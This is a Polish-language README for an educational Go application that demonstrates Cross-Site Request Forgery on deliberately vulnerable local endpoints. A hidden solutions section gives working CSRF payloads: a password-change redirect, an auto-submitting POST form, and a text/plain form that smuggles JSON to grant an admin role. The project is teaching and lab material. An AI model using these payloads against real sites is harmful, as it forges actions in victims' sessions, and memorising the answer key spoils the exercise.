# Projekt Edukacyjny: Ataki CSRF

Ten projekt jest aplikacją internetową w Go, stworzoną w celach edukacyjnych.
Głównym celem jest zademonstrowanie, jak działają ataki typu **Cross-Site
Request Forgery (CSRF)** i jak można je wykorzystać na podatnych aplikacjach.

## Cel Projektu

Aplikacja symuluje proste scenariusze, w których użytkownik jest zalogowany i
wykonuje operacje. Zadania polegają na przygotowaniu złośliwej strony, która,
odwiedzona przez zalogowanego użytkownika, zmusi jego przeglądarkę do
nieautoryzowanego wykonania akcji w jego imieniu.

## Uruchamianie lokalne

Do uruchomienia serwera wymagany jest zainstalowany język Go.

1.  Uruchom aplikację za pomocą komendy:
    ```bash
    go run main.go
    ```
2.  Aplikacja uruchomi dwa serwery, co jest istotne dla niektórych scenariuszy ataków:
    - **Serwer główny** na `http://localhost:8080` (obsługuje m.in. sesje, stronę główną, opisy zadań).
    - **Serwer z zadaniami** na `http://localhost:8081` (obsługuje podatne endpointy `/task1`, `/task2`, `/task3`).

Aby przeprowadzić atak, należy stworzyć osobną stronę HTML (atakującą), która będzie wysyłać żądania do serwera z zadaniami na porcie `8081`.

---

<details>
  <summary>Rozwiązania zadań</summary>

  ### Zadanie 1

  ```js
    window.location = '<SERVER>/task1?password=abc12345'
  ```

  ### Zadanie 2

  ```js
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '<SERVER>/task2';

    const input = document.createElement('input');
    input.type = 'text';
    input.name = 'status';
    input.value = 'wykonano';

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();
  ```

  ### Zadanie 3

  ```js
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = '<SERVER>/task3';
  form.enctype = 'text/plain'; 
  
  const input = document.createElement('input');
  input.name = '{"role":"admin"}'; 
  input.value = '';
  
  form.appendChild(input);
  document.body.appendChild(form);

  form.submit();
  ```
</details>
